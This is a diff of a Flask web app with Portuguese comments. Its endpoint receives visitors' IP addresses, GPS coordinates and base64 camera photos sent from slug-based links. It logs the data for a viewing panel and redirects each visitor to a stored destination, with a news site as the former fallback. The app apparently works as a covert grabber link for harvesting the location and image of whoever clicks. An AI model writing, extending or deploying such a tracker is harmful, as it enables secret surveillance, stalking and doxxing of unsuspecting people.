@@ -188,43 +188,39 @@ def excluir_link(link_id):
     db.session.delete(link)
     db.session.commit()
     return redirect(url_for('todos_links'))
-
+def buscar_destino_por_slug(slug):
+    # Exemplo: Buscar no banco de dados com base no slug
+    link = Link.query.filter_by(slug=slug).first()
+    if link:
+        return link.destino
+    return "Destino não encontrado"
 
 # Coleta dados de IP, localização e foto
 @app.route("/coletar_dados", methods=["POST"])
 def coletar_dados():
-    data = request.json
-    ip = request.remote_addr
-    user_agent = request.headers.get("User-Agent")
+    data = request.get_json()
+
     slug = data.get("slug")
+    latitude = data.get("latitude")
+    longitude = data.get("longitude")
+    foto_base64 = data.get("foto_base64")
 
-    acesso = Acesso(
-        slug=slug,
-        ip=ip,
-        user_agent=user_agent,
-        latitude=data.get("latitude"),
-        longitude=data.get("longitude"),
-        foto_base64=data.get("foto_base64")
-        
-    )
-    db.session.add(acesso)
+    # IP capturado diretamente do request
+    ip_usuario = request.headers.get('X-Forwarded-For', request.remote_addr)
 
-    # Atualiza o último registro
-    ultimo = Registro.query.order_by(Registro.id.desc()).first()
-    if ultimo:
-        if 'latitude' in data and 'longitude' in data:
-            ultimo.latitude = data['latitude']
-            ultimo.longitude = data['longitude']
-        if 'foto_base64' in data:
-            ultimo.foto_base64 = data['foto_base64']
+    # Log para debug ou persistência
+    print("📥 Dados recebidos:")
+    print("Slug:", slug)
+    print("IP:", ip_usuario)
+    print("Latitude:", latitude)
+    print("Longitude:", longitude)
+    print("Foto base64:", "SIM" if foto_base64 else "NÃO")
+    print("Timestamp:", datetime.now().strftime("%d/%m/%Y %H:%M:%S"))
 
-    db.session.commit()
+    # Aqui você pode salvar os dados no banco, por exemplo:
+    # salvar_no_banco(slug, ip_usuario, latitude, longitude, foto_base64)
 
-    destino = Link.query.filter_by(slug=slug).first()
-    if destino:
-        return jsonify({"destino": destino.destino})
-    else:
-        return jsonify({"destino": "https://g1.globo.com"})
+    return jsonify({ "status": "ok", "destino": buscar_destino_por_slug(slug) })
 
 # Painel para visualizar os acessos
 @app.route("/painel")
